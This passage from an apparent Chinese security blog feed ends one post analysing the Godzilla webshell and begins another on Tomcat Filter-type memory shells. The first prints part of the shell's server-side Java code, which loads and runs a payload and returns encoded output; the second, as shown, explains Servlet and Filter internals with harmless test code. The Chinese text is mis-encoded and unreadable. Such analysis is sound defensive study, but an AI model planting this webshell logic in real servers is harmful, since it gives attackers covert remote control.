                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;basic.payload&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toByteArray&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚&lt;br&gt;&lt;img src=&quot;/2022/05/17/godzilla/1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬ä¸€æ¬¡è¯·æ±‚&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€æ¬¡è¯·æ±‚&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€æ¬¡è¯·æ±‚&quot;&gt;&lt;/a&gt;ç¬¬ä¸€æ¬¡è¯·æ±‚&lt;/h3&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(3)-å†…å­˜é©¬ä¹‹Filterå‹</title>
    <link href="https://jkme.github.io/2022/04/14/memory-shell-1.html"/>
    <id>https://jkme.github.io/2022/04/14/memory-shell-1.html</id>
    <published>2022-04-13T16:00:00.000Z</published>
    <updated>2022-04-22T07:21:56.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><img src="/2022/04/14/memory-shell-1/Servlet.png"></p><p>å½“å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼šè¯·æ±‚ â†’ Listener â†’ Filter â†’ Servlet</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listenerä¹Ÿç§°ä¹‹ä¸ºç›‘å¬å™¨ï¼Œå¯ä»¥ç›‘å¬Applicationã€Sessionå’ŒRequestå¯¹è±¡çš„åˆ›å»ºã€é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬å¯¹å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§äº‹ä»¶ï¼Œå¹¶è‡ªåŠ¨æ‰§è¡Œè‡ªå®šä¹‰çš„åŠŸèƒ½ã€‚</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œå¯ä»¥åŠ¨æ€åœ°ä¿®æ”¹HttpServletRequestï¼ŒHttpServletResponseä¸­çš„å¤´å’Œæ•°æ®ã€‚</p><h4 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servletæ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚Servlet å¯ä»¥ç†è§£ä¸ºæŸä¸€ä¸ªè·¯å¾„åç»­çš„ä¸šåŠ¡å¤„ç†é€»è¾‘ã€‚</p><p>Tomcatæ˜¯httpæœåŠ¡å™¨+servletå®¹å™¨ï¼Œå½“Tomcatä½œä¸ºServletå®¹å™¨çš„æ—¶å€™ï¼Œè®²httpè¯·æ±‚æ–‡æœ¬è§£æä¹‹åå°è£…æˆ<code>HttpServletRequest</code>ç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™Servletï¼ŒåŒæ—¶è®²ç›¸åº”çš„ä¿¡æ¯å°è£…ä¸º<code>HttpServletResponse</code>ç±»å‹çš„responseå¯¹è±¡ï¼Œå°†responseå¯¹è±¡äº¤ç»™tomcatï¼Œtomcatæ ¼å¼åŒ–ä¹‹åè¿”å›ç»™æµè§ˆå™¨</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h4 id="å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰"><a href="#å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰" class="headerlink" title="å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰"></a>å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰</h4><p>Tomcatæœ‰å››ç§ç±»å‹çš„Servletå®¹å™¨ç»„ä»¶ï¼Œä»ä¸Šåˆ°ä¸‹ï¼š</p><ol><li>Engineï¼š<code>org.apache.catalina.core.StandardEngine</code><ul><li>æœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ªHost</li></ul></li><li>Host: <code>org.apache.catalina.core.StandardHost</code><ul><li>ä¸€ä¸ªHostä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚</li></ul></li><li>Context: <code>org.apache.catalina.core.StandardContext</code><ul><li>ä¸€ä¸ªContext ä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper</li></ul></li><li>Wrapper: <code>org.apache.catalina.core.StandardWrapper</code><ul><li>ä¸€ä¸ªWrapper ä»£è¡¨ä¸€ä¸ªServlet</li></ul></li></ol><p>æ¯ä¸ªHostä¸‹å¯ä»¥æœ‰å¤šä¸ªContextï¼ˆContextæ˜¯Hostçš„å­å®¹å™¨ï¼‰ï¼Œæ¯ä¸ªContextéƒ½ä»£è¡¨ä¸€ä¸ªå…·ä½“çš„Webåº”ç”¨ï¼Œéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„è·¯å¾„å°±ç›¸å½“äºä¸‹å›¾ä¸­çš„<code>/shop/manager</code>è¿™ç§ï¼Œåœ¨ä¸€ä¸ª Contextä¸‹å¯ä»¥æœ‰ç€å¤šä¸ªWrapper, Wrapperä¸»è¦è´Ÿè´£ç®¡ç†Servlet, åŒ…æ‹¬çš„Servletçš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶</p><p><img src="/2022/04/14/memory-shell-1/1.png"></p><h2 id="Context"><a href="#Context" class="headerlink" title="*Context"></a>*Context</h2><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>åœ¨<code>javax.servlet.ServletContext</code>é‡Œé¢ï¼ŒServletè§„å®šäº†<code>ServletContext</code>æ¥å£:<br><img src="/2022/04/14/memory-shell-1/2.png"></p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>åœ¨<code>org.apache.catalina.core.ApplicationContext</code>é‡Œé¢ï¼Œ<code>ApplicationContext</code>ç±»æ˜¯<code>ServletContext</code>çš„æ¥å£å®ç°ï¼Œ<code>ApplicationContext</code>ç±»çš„å®ä¾‹å’Œ<code>StandardContext</code>çš„æ¯ä¸ªå®ä¾‹ç›¸å…³è”ï¼Œæ¯”å¦‚å‘<code>StandardContext</code>å®ä¾‹æ·»åŠ <code>fiterDef</code>ç­‰<br><img src="/2022/04/14/memory-shell-1/3.png"></p><h4 id="StanderContext"><a href="#StanderContext" class="headerlink" title="StanderContext"></a>StanderContext</h4><p><code>org.apache.catalina.Context</code>çš„é»˜è®¤æ ‡å‡†å®ç°ä¸º<code>org.apache.catalina.core.StandardContext</code>ï¼Œè¡¨ç¤ºæ¯ä¸€ä¸ªwebåº”ç”¨</p><h2 id="Tomcatä¸‹Filterçš„å®ç°é€»è¾‘"><a href="#Tomcatä¸‹Filterçš„å®ç°é€»è¾‘" class="headerlink" title="Tomcatä¸‹Filterçš„å®ç°é€»è¾‘"></a>Tomcatä¸‹Filterçš„å®ç°é€»è¾‘</h2><h3 id="Filterçš„åˆå§‹åŒ–"><a href="#Filterçš„åˆå§‹åŒ–" class="headerlink" title="Filterçš„åˆå§‹åŒ–"></a>Filterçš„åˆå§‹åŒ–</h3><p>åœ¨IDEAé‡Œé¢æ–°å»ºé¡¹ç›®ä¹‹åæ–°å¢æµ‹è¯•ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestFilter.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec doFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestServlet.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"TestServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/TestServlet"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello GET~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello POST~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨<code>web.xml</code>é‡Œé¢æ–°å¢Filterçš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>basic.TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/TestServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨web.xmlè¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œ<code>&lt;filter&gt;&lt;/filter&gt;</code>æ ‡ç­¾å…¶å®å¯¹åº”çš„å°±æ˜¯<code>org.apache.tomcat.util.descriptor.web.FilterDef</code>ï¼Œ<code>&lt;filter-mapping&gt;&lt;/filter-mapping&gt;</code>æ ‡ç­¾å¯¹åº”çš„æ˜¯<code>org.apache.tomcat.util.descriptor.web.FilterMap</code></p><p>åœ¨<code>StandardContext</code>ç±»ä¸­çš„startInternalæ–¹æ³•é‡Œå¯ä»¥çœ‹åˆ°è¿™æ ·çš„åŠ è½½é¡ºåº:<br><img src="/2022/04/14/memory-shell-1/tomcat-1.png"><br>å…ˆå¯åŠ¨listenerï¼Œå†è€…æ˜¯Filterï¼Œæœ€åæ˜¯Servletã€‚è¯¦ç»†åˆ†æfilterStartä¸­æ˜¯å¦‚ä½•åŠ 